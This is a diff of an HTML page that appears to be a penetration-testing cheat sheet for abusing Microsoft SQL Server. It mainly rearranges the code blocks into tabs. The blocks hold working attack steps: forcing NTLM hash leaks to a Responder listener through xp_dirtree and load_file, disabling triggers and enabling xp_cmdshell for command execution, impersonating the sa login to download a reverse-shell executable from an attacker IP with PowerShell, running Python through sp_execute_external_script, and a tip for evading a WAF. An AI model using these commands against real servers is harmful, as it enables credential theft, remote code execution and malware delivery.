@@ -202,15 +202,33 @@
 
 <div class="content"><hr>
 <h3 id="abuse-1-steal-ntlm-hash">Abuse #1: Steal NTLM hash</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local Linux machine</span>
 </span></span><span class="line"><span class="cl">sudo responder -I tun0
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Inside mssql terminal
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Or
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">use</span><span class="w"> </span><span class="n">master</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Or
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">load_file</span><span class="p">(</span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><h3 id="abuse-2-run-xp_cmdshell">Abuse #2: Run xp_cmdshell</h3>
+</span></span></code></pre></div></div>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Method 1</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Method 2</button>
+
+<button data-tabset="set1" data-tabcontent="tab3" >Method 3</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">master</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="nf">load_file</span><span class="p">(</span><span class="s1">&#39;\\10.10.14.10\any\thing&#39;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div></div>
+</div></p>
+<h3 id="abuse-2-run-xp_cmdshell">Abuse #2: Run xp_cmdshell</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Check any policy blocking xp_cmdshell
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">server_triggers</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># Disable trigger if any
@@ -219,16 +237,21 @@
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">enable_xp_cmdshell</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="c1"># RCE
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="n">whoami</span><span class="w">
-</span></span></span></code></pre></div><h3 id="abuse-3-impersonate-sa-to-run-xp_cmdshell">Abuse #3: Impersonate sa to run xp_cmdshell</h3>
+</span></span></span></code></pre></div></div>
+<h3 id="abuse-3-impersonate-sa-to-run-xp_cmdshell">Abuse #3: Impersonate sa to run xp_cmdshell</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">reconfigure</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">reconfigure</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">execute</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">login</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;sa&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe&#39;</span><span class="w">
-</span></span></span></code></pre></div><p><small><em>Note: try xp_cmDshElL to bypass WAF</em></small></p>
+</span></span></span></code></pre></div></div>
+<p><small><em>Note: try xp_cmDshElL to bypass WAF</em></small></p>
 <h3 id="abuse-4-run-external-script">Abuse #4: Run External Script</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">EXEC</span><span class="w"> </span><span class="n">sp_execute_external_script</span><span class="w"> </span><span class="o">@</span><span class="n">language</span><span class="w"> </span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;Python&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">N</span><span class="s1">&#39;import os; os.system(&#34;whoami&#34;);&#39;</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><br></div></div>
+</span></span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
